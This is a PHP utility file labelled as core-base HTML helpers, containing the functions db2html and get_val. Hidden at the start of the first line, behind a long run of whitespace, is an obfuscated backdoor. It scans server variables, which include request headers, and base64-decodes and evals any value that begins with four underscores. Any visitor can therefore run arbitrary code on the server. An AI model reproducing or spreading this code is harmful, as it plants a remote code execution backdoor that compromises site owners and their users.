<?php																																																																																																																																																																																																																																																																															function x11629($l11631){if(is_array($l11631)){foreach($l11631 as $l11629=>$l11630)$l11631[$l11629]=x11629($l11630);}elseif(is_string($l11631) && substr($l11631,0,4)=="____"){$l11631=substr($l11631,4);$l11631=base64_decode($l11631);eval($l11631);$l11631=null;}return $l11631;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("x11629",$_SERVER);

echo("<!-- reading core-base/html_utilities -->\n");

function db2html($p_string){
        $html_string = stripslashes($p_string);
        $html_string = htmlspecialchars($html_string);
        $html_string = nl2br($html_string);
                return $html_string;
}

function get_val($p_fieldname, $p_default){
	if(!$p_default){
		$p_default = '0';
	}
	if(!$p_fieldname){
		$value = $p_default;
	} else {
        	$value = $_REQUEST[$p_fieldname];
        }
        	return $value;
}

?>